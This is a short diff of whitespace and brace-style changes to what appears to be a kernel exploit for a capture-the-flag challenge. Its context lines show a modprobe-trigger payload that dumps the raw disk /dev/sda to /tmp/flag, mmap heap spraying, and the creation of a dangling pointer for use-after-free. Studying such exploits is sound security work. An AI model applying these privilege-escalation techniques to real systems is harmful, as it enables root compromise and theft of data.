@@ -15,8 +15,7 @@
 #define PAYLOAD "#!/bin/sh\ncat /dev/sda > /tmp/flag"
 
 // trigger modprobe
-int win()
-{
+int win() {
   int fd, count;
   char buf[0x100] = {0};
 
@@ -57,7 +56,7 @@ int main(int argc, char* argv[]) {
 
   for (int i = 0; i < N_SPRAY; i++)
     spray[i] = mmap((void*)(0xdead000000 + i*0x10000), 0x8000,
-             PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
+                    PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
 
   linfo("create dangeling ptr");
   ptr = keap_malloc(PTE_SIZE, GFP_KERNEL);
